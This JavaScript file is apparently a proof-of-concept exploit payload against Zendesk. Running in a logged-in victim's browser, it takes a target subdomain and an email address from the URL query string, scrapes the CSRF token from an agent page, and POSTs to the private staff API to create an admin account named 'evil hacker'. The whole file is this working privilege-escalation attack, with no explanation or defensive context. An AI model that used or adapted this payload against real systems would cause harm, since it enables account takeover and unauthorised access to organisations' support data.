const params = new URLSearchParams( document.location.search );

const newEmail = params.get( 'email' );
const subdomain = params.get( 'subdomain' );

( async function() {await addNewAdminUser( 'evil hacker', newEmail );})()

async function addNewAdminUser( name, email ) {
    const data = {
        user: {
            name,
            email
        },
        entitlements: {
            support: {
                name: 'admin',
                is_active: true
            }
        }
    }

    const payload = JSON.stringify( data );

    const url = `https://${ subdomain }.zendesk.com/agent/user_filters`;
    const parsedHtml = await _getParsedHtmlFromUrl( url );
    const csrfToken = _getCsrfToken( parsedHtml );

    const response = await fetch( `https://${ subdomain }.zendesk.com/api/admin/private/staff`, { 
        method: 'POST',
        withCreds: true ,
        headers:{
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrfToken
        },    
        body: payload 
    } );

}

async function _getParsedHtmlFromUrl( url ) {
    const domParser = new DOMParser();
    const page = await fetch( url, { withCreds: true } );

    const pageBody = await page.text()
    const pageHtml = domParser.parseFromString( pageBody, 'text/html' );

    return pageHtml;
}

function _getCsrfToken( html ) {
    const tokenElement = html.querySelector( 'meta[name="csrf-token"]' );
    const csrfToken = tokenElement.getAttribute( 'content' );

    return csrfToken;
}
